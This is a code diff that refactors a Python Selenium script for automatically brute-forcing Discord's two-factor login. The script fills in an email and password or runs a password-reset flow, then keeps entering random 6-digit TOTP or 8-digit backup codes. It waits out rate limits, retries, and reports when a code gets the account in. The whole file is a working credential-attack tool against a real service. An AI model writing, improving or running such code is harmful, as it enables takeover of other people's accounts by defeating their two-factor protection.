@@ -1,25 +1,25 @@
 # Import dependencies and libraries
 import time
 import secrets
-from src.lib.codegen import genRandomCode
+from src.lib.codegen import generate_random_code
 from src.lib.textcolor import color
 
 # Import Selenium libraries and dependencies
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-from selenium.common.exceptions import NoSuchElementException, InvalidSessionIdException
+from selenium.common.exceptions import NoSuchElementException, NoSuchWindowException
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 
-def browserBootstrap(
-	cfg: dict,
+def bootstrap_browser(
+	configuration: dict,
 ) -> webdriver.chrome.webdriver.WebDriver:
 	"""
-	browserBootstrap is a function that initializes and returns a WebDriver object of the Chrome browser. 
-	:param cfg: a dictionary object which holds the program mode as key-value pairs. 
-	:type cfg: dict
+	bootstrap_browser is a function that initializes and returns a WebDriver object of the Chrome browser. 
+	:param configuration: a dictionary object which holds the program mode as key-value pairs. 
+	:type configuration: dict
 	:return: a WebDriver object of the Chrome browser.
 	:rtype: webdriver.chrome.webdriver.WebDriver
 	"""
@@ -47,48 +47,48 @@ def browserBootstrap(
 	driver.execute_cdp_cmd('Network.enable', {})
 
 	# Go to the appropriate starting page for the mode
-	match cfg['programMode'].lower():
+	match configuration['programMode'].lower():
 		case 'login':
 			# Go to the discord login page
 			driver.get('https://www.discord.com/login')
 		case 'reset':
 			# Go to the discord page
-			driver.get('https://discord.com/reset#token=' + cfg['resetToken'])
+			driver.get('https://discord.com/reset#token=' + configuration['resetToken'])
 	# Wait 1 second before typing the email and password
-	time.sleep(1)
+	driver.implicitly_wait(1)
 	return driver
 
-def loginBootstrap(
+def bootstrap_login_page(
 	driver: webdriver.chrome.webdriver.WebDriver,
-	cfg: dict,
+	configuration: dict,
 ):
 	"""
 	Login Bootstrap is a function that takes in two parameters:
 	1. driver: A web driver object of Chrome
-	2. cfg: A dictionary of configuration keys and values
-	The function locates the login input fields based on the `cfg` parameter's `programMode`. If `programMode` is 'login',
-	the email and password fields are located, and the values of the fields are filled using `cfg`. If `programMode` is 'reset',
-	only the password field is located and filled in with the `newPassword` key from `cfg`. The function then attempts to find
+	2. configuration: A dictionary of configuration keys and values
+	The function locates the login input fields based on the `configuration` parameter's `programMode`. If `programMode` is 'login',
+	the email and password fields are located, and the values of the fields are filled using `configuration`. If `programMode` is 'reset',
+	only the password field is located and filled in with the `newPassword` key from `configuration`. The function then attempts to find
 	a TOTP login field, and if found, calls the `codeEntry()` function to enter the authentication code. If a `NoSuchElementException`
 	is caught while trying to find the TOTP login field, the function continues to run, assuming that the hCaptcha has been completed.
 	"""
 	# Find the login input fields
-	loginFields = {
+	login_fields = {
 		'password': driver.find_element(by=By.NAME, value='password')
 	}
-	match cfg['programMode'].lower():
+	match configuration['programMode'].lower():
 		case 'login':
-			loginFields['email'] = driver.find_element(by=By.NAME, value='email')
+			login_fields['email'] = driver.find_element(by=By.NAME, value='email')
 			# Enter the email and password. 
 			#Uses jugaad syntax to get and fill in the email and password user details in the appropriate field.
-			for i in loginFields:
-				loginFields[i].send_keys(cfg[i])
+			for i in login_fields:
+				login_fields[i].send_keys(configuration[i])
 		case 'reset':
 			# Enter the new password
-			loginFields['password'].send_keys(cfg['newPassword'])
+			login_fields['password'].send_keys(configuration['newPassword'])
 	
 	# Click Enter/Return to submit the user details
-	loginFields['password'].send_keys(Keys.RETURN)
+	login_fields['password'].send_keys(Keys.RETURN)
 
 	# Start code entering
 	#loginTOTP = otp input field. TOTP stands for Timed One Time Password
@@ -97,154 +97,159 @@ def loginBootstrap(
 		# Attempt to find the TOTP login field
 		try:
 			
-			match cfg['codeMode']:
+			match configuration['codeMode']:
 				case 'normal':
-					loginFields['TOTP'] = driver.find_element(by=By.XPATH, value="//input[@placeholder='6-digit authentication code']")
+					login_fields['TOTP'] = driver.find_element(by=By.XPATH, value="//input[@placeholder='6-digit authentication code']")
 
 				case 'backup':
-					time.sleep(0.5)
 					driver.find_element(By.XPATH, "//*[@id='app-mount']/div[2]/div[1]/div[1]/div/div/div/section/div[2]/div/div/form/div[3]/button[1]").click() # These will need to be cleaned up at some point but they work
-					time.sleep(0.5)
+					driver.implicitly_wait(1)
 					driver.find_element(By.XPATH, "//*[@id='app-mount']/div[2]/div[1]/div[1]/div/div/div/section/div[2]/div/div/div[2]/div[2]").click() # These will need to be cleaned up at some point but they work
-					time.sleep(0.5)
-					loginFields['TOTP'] = driver.find_element(by=By.XPATH, value="//input[@placeholder='8-digit backup code']")
+					driver.implicitly_wait(1)
+					login_fields['TOTP'] = driver.find_element(by=By.XPATH, value="//input[@placeholder='8-digit backup code']")
+					driver.implicitly_wait(1)
 					
 			# Auto-triggers the password reset flow
 			if ('Please reset your password to log in.' in driver.page_source):
-				cfg['programMode'] = 'reset'
-				codeEntry(driver, loginFields, cfg)
-			codeEntry(driver, loginFields, cfg)
+				configuration['programMode'] = 'reset'
+				code_entry(driver, login_fields, configuration)
+			code_entry(driver, login_fields, configuration)
 		except NoSuchElementException: # This try-except block constantly checks whether the hCaptcha has been completed, and if so, it will continue to the next phase.
 			pass
-		except InvalidSessionIdException: # If the browser window is closed stop looking for TOTP login field 
+		except NoSuchWindowException: # If the browser window is closed stop looking for TOTP login field 
 			break
-def codeEntry(
+
+def code_entry(
 	     driver: webdriver.chrome.webdriver.WebDriver,
-	loginFields: dict,
-	     cfg: dict
+	login_fields: dict,
+	     configuration: dict
 ):
-	"""
-	Enter OTP codes continuously until successful login, using the provided webdriver, 
-	loginFields dictionary, and configuration dictionary. Returns nothing. 
+	try:
+		"""
+		Enter OTP codes continuously until successful login, using the provided webdriver, 
+		loginFields dictionary, and configuration dictionary. Returns nothing. 
 
-	:param driver: A webdriver object.
-	:type driver: webdriver.chrome.webdriver.WebDriver
-	:param loginFields: A dictionary of login fields.
-	:type loginFields: dict
-	:param cfg: A dictionary of configuration values.
-	:type cfg: dict
-	"""
-	# Set up statistics counters
-	statistics = {
-		'attemptedCodeCount':   0,
-		    'ratelimitCount':   0,
-		       'elapsedTime': 0.0,
-		       'programMode':  '',
-		          'codeMode':  '',
-	}
+		:param driver: A webdriver object.
+		:type driver: webdriver.chrome.webdriver.WebDriver
+		:param loginFields: A dictionary of login fields.
+		:type loginFields: dict
+		:param configuration: A dictionary of configuration values.
+		:type configuration: dict
+		"""
+		# Set up statistics counters
+		session_statistics = {
+			'attemptedCodeCount':   0,
+			    'ratelimitCount':   0,
+			       'elapsedTime': 0.0,
+			       'programMode':  '',
+			          'codeMode':  '',
+		}
 
-	#Logic to continuously enter OTP codes
-	time.sleep(0.3)
-	startTime = time.time()
-	sleepDuration = 0
-	while (True):
-		# Inform user TOTP field was found
-		if statistics['attemptedCodeCount'] == 0:
-			for i in cfg:
-				statistics[i] = cfg[i]
-				print(f"{color(i, 'green')}: {statistics[i]}")
-			print(f"TOTP login field: {color('Found','green')}")
-			print(f"Forcer: {color('Starting','green')}")
-			print(f"Program Mode: {color(cfg['programMode'].lower(), 'green')}")
-			print(f"Code Mode: {color(cfg['codeMode'].lower(), 'green')}")
+		#Logic to continuously enter OTP codes
+		time.sleep(0.3)
+		start_time = time.time()
+		sleep_duration_seconds = 0
+		while (True):
+			# Inform user TOTP field was found
+			if session_statistics['attemptedCodeCount'] == 0:
+				for i in configuration:
+					session_statistics[i] = configuration[i]
+					print(f"{color(i, 'green')}: {session_statistics[i]}")
+				print(f"TOTP login field: {color('Found','green')}")
+				print(f"Forcer: {color('Starting','green')}")
+				print(f"Program Mode: {color(configuration['programMode'].lower(), 'green')}")
+				print(f"Code Mode: {color(configuration['codeMode'].lower(), 'green')}")
 
-		# Generate a new code and enter it into the TOTP field
-		totpCode = genRandomCode(cfg['codeMode'].lower())
-		
-		# Use the 8-digit code only if it's not in the usedcodes.txt list
-		if len(totpCode) == 8:
-			with open('user/usedcodes.txt', 'a+') as f:
-				f.seek(0)
-				usedcodes = f.read() 
-				if totpCode in usedcodes:
-					continue
-				else:
-					f.write(f"{totpCode}\n")
+			# Generate a new code and enter it into the TOTP field
+			totp_code = generate_random_code(configuration['codeMode'].lower())
 
-		# Send the code
-		loginFields['TOTP'].send_keys(totpCode)
-		loginFields['TOTP'].send_keys(Keys.RETURN)
-		statistics['attemptedCodeCount'] += 1
-		time.sleep(0.3) # Wait for page to update so we can detect changes such as rate limited.   
+			# Use the 8-digit code only if it's not in the used_backup_codes.txt list
+			if len(totp_code) == 8:
+				with open('user/used_backup_codes.txt', 'a+') as f:
+					f.seek(0)
+					used_backup_codes = f.read() 
+					if totp_code in used_backup_codes:
+						continue
+					else:
+						f.write(f"{totp_code}\n")
 
-		while ('rate limit.' in driver.page_source):
-			sleepDuration = secrets.choice(range(5, 7))
-			statistics['ratelimitCount'] += 1
-			print(f"Code: {color(totpCode, 'blue')} was {color('Ratelimited', 'yellow')} will retry in {color(sleepDuration, 'blue')}")
-			time.sleep(sleepDuration)
-			loginFields['TOTP'].send_keys(Keys.RETURN)
-			time.sleep(0.3)
+			# Send the code
+			login_fields['TOTP'].send_keys(totp_code)
+			login_fields['TOTP'].send_keys(Keys.RETURN)
+			session_statistics['attemptedCodeCount'] += 1
+			driver.implicitly_wait(0.3) # Wait for page to update so we can detect changes such as rate limited.   
 
-		if ('Token has expired' in driver.page_source): 
-			#Print this out as well as some statistics, and prompt the user to retry.
-			statistics['elapsedTime'] = time.time() - startTime
-			finalStatDisplay('invalidPasswordResetToken', statistics)
-			# Close the browser and stop the script.
-			driver.close()
-			break
-			
-		# This means that Discord has expired this login session, we must restart the process.
-		elif ('auth code' in driver.page_source):
-			#  Testing for a new localised message.
-			#  Print this out as well as some statistics, and prompt the user to retry.
-			statistics['elapsedTime'] = time.time() - startTime
-			finalStatDisplay('invalidSessionTicket', statistics)
-			# Close the browser and stop the script.
-			driver.close()
-			break
+			while ('rate limit.' in driver.page_source):
+				sleep_duration_seconds = secrets.choice(range(5, 7))
+				session_statistics['ratelimitCount'] += 1
+				print(f"Code: {color(totp_code, 'blue')} was {color('Ratelimited', 'yellow')} will retry in {color(sleep_duration_seconds, 'blue')}")
+				time.sleep(sleep_duration_seconds)
+				login_fields['TOTP'].send_keys(Keys.RETURN)
+				driver.implicitly_wait(0.3)
 
-		# The entered TOTP code is invalid. Wait a few seconds, then try again.
-		else:
-			sleepDuration = secrets.choice(range(2, 6))
-		#Testing if the main app UI renders.
-		try:
-			# Wait 1 second, then check if the Discord App's HTML loaded by it's CSS class name. If loaded, then output it to the user.
-			time.sleep(1)
-			loginTest = driver.find_element(by=By.CLASS_NAME, value='app-2CXKsg')
-			print(color(f"Code {totpCode} worked!", 'green'))
-			break
-		except NoSuchElementException:
-			# This means that the login was unsuccessful so let's inform the user and wait.
-			print(f"Code: {color(totpCode, 'blue')} did not work, delay: {color(sleepDuration, 'blue')}")
-			time.sleep(sleepDuration)
-			# Backspace the previously entered TOTP code.
-			for i in range(len(totpCode)):
-				loginFields['TOTP'].send_keys(Keys.BACKSPACE)
+			if ('Token has expired' in driver.page_source): 
+				#Print this out as well as some statistics, and prompt the user to retry.
+				session_statistics['elapsedTime'] = time.time() - start_time
+				print_session_statistics('invalid_password_reset_token', session_statistics)
+				# Close the browser and stop the script.
+				driver.close()
+				break
 
-def finalStatDisplay(
-	haltReason: str,
-	statistics: dict
+			# This means that Discord has expired this login session, we must restart the process.
+			elif ('Invalid token' in driver.page_source):
+				#  Testing for a new localised message.
+				#  Print this out as well as some statistics, and prompt the user to retry.
+				session_statistics['elapsedTime'] = time.time() - start_time
+				print_session_statistics('invalid_session_ticket', session_statistics)
+				# Close the browser and stop the script.
+				driver.close()
+				break
+
+			# The entered TOTP code is invalid. Wait a few seconds, then try again.
+			else:
+				sleep_duration_seconds = secrets.choice(range(2, 6))
+			#Testing if the main app UI renders.
+			try:
+				# Wait 1 second, then check if the Discord App's HTML loaded by it's CSS class name. If loaded, then output it to the user.
+				loginTest = driver.find_element(by=By.CLASS_NAME, value='app-2CXKsg')
+				driver.implicitly_wait(1)
+				print(color(f"Code {totp_code} worked!", 'green'))
+				break
+			except NoSuchElementException:
+				# This means that the login was unsuccessful so let's inform the user and wait.
+				print(f"Code: {color(totp_code, 'blue')} did not work, delay: {color(sleep_duration_seconds, 'blue')}")
+				time.sleep(sleep_duration_seconds)
+				# Backspace the previously entered TOTP code.
+				for i in range(len(totp_code)):
+					login_fields['TOTP'].send_keys(Keys.BACKSPACE)
+	except NoSuchWindowException:
+		session_statistics['elapsedTime'] = time.time() - start_time
+		print_session_statistics('invalid_session_ticket', session_statistics)
+
+def print_session_statistics(
+	halt_reason: str,
+	session_statistics: dict
 ):
 	"""
 	Displays statistics and the reason for program halt.
 
-	:param haltReason: A string representing the reason why the program halted.
-	:type haltReason: str
-	:param statistics: A dictionary containing statistical data.
-	:type statistics: dict
+	:param halt_reason: A string representing the reason why the program halted.
+	:type halt_reason: str
+	:param session_statistics: A dictionary containing statistical data.
+	:type session_statistics: dict
 	:return: This function does not return anything.
 	"""
-	haltReasons = {
-			 'invalidSessionTicket': 'Invalid session ticket',
-		'invalidPasswordResetToken': 'Invalid password reset token',
-			'passwordResetRequired': 
+	halt_reasons = {
+			 'invalid_session_ticket': 'Invalid session ticket',
+		'invalid_password_reset_token': 'Invalid password reset token',
+			'password_reset_required': 
 									f"We need to reset the password!\n"\
 									f"Running {color('reset program mode', 'green')}!\n"\
 									f"{color('(This feature will only work if the resetToken is filled in the .env file.)', 'yellow')}"
 	}
-	print(color(f"Halt reason:            {         haltReasons[haltReason]}", 'red' ))
-	print(color(f"Program mode:           {       statistics['programMode']}", 'blue'))
-	print(color(f"Code mode:              {          statistics['codeMode']}", 'blue'))
-	print(color(f"Number of tried codes:  {statistics['attemptedCodeCount']}", 'blue'))
-	print(color(f"Time elapsed for codes: {       statistics['elapsedTime']}", 'blue'))
-	print(color(f"Number of ratelimits    {    statistics['ratelimitCount']}", 'blue'))
+	print(color(f"Halt reason:            {         halt_reasons[halt_reason]}", 'red' ))
+	print(color(f"Program mode:           {       session_statistics['programMode']}", 'blue'))
+	print(color(f"Code mode:              {          session_statistics['codeMode']}", 'blue'))
+	print(color(f"Number of tried codes:  {session_statistics['attemptedCodeCount']}", 'blue'))
+	print(color(f"Time elapsed for codes: {       session_statistics['elapsedTime']}", 'blue'))
+	print(color(f"Number of ratelimits    {    session_statistics['ratelimitCount']}", 'blue'))
